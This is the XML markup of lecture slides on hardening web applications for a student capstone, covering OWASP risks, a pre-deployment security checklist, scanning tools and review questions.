              <a:t> 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   </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// Security events</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>responseTime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250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method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'GET'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> })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// Performance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>OWASP #9: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Logging &amp; Monitoring Failures</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — if you can’t detect a breach, you can’t respond to it.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10: Your Hardening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your capstone project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Pre-Deployment Checklist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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ All secrets in environment variables (not code)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.env</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>.gitignore</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Passwords hashed with bcrypt/Argon2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ JWT tokens have short TTL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Every API route checks ownership (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>userId</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> filter)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Input validated server-side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helmet()</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> middleware enabled</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ CORS configured with specific origins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npm audit</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> shows zero critical vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ HTTPS enabled (automatic on Vercel/CloudFront)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Reliability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Error handler returns generic messages in prod</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Timeouts on all external calls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Health check endpoint (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/api/health</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Database connection pooling / caching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Lock file committed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npm ci</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> used in CI/CD (not </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm install</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Compression middleware enabled</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Static assets served via CDN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Structured logging (no sensitive data)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ README with setup and deploy instructions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Security Scanning Tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Run these against your deployed app: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1100"/>
                <a:gridCol w="2946400"/>
                <a:gridCol w="97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checks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URL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SecurityHeaders.com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 security headers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securityheaders.com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SSL Labs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ssllabs.com/ssltest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npm audit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Dependency vulnerabilities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CLI: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>npm audit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Lighthouse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Performance, accessibility, SEO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DevTools &gt; Lighthouse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OWASP ZAP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vulnerability scanning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zaproxy.org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Architecture Review Questions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Before your final presentation, ask yourselves:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If our database is breached</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, are passwords safe? (hashed with bcrypt/Argon2?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If a JWT is stolen</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, what’s the blast radius? (short TTL? ownership checks?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If a dependency has a CVE</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, how fast can we update? (lock file? CI/CD?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If our API gets 10x traffic</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, what breaks first? (caching? DB indexes? connection pool?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If our app throws an error</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, does the user see a stack trace? (error handler?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If we need to audit user actions</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, can we search logs? (structured logging?)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 b="1"/>
              <a:t>Hardening is defense in depth</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — network, transport, application, and data layers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>OWASP Top 10</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> maps directly to what you’ve built — broken access control and injection are #1 and #3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Authentication hardening</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> goes beyond “it works” — rate limiting, token rotation, proper hashing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Security headers</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>helmet</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) are one line of code for massive protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Never trust client input</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — validate server-side, use parameterized queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Dependencies are attack surface</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — audit, lock, update</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Errors in production must be generic</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — log details, show nothing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>If you can’t see it, you can’t fix it</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — structured logging and monitoring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Next Steps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Today:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Apply the hardening checklist to your capstone project</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>April 28:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Final presentations — be ready to discuss your hardening decisions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Deliverables:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Working deployed app, technical documentation, architecture decision records</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Final tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Security is not a feature you add at the end. But if you haven’t added it yet, </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1"/>
              <a:t>today</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> is the best day to start.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Hardening Web Applications</dc:title>
  <dc:creator>Jason Kuruzovich</dc:creator>
  <cp:keywords/>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-24T15:37:21Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-24T15:37:21Z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April 24, 2026</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="subtitle">
    <vt:lpwstr>Security, Performance, and Production Readiness</vt:lpwstr>
  </property>
</Properties>
</file>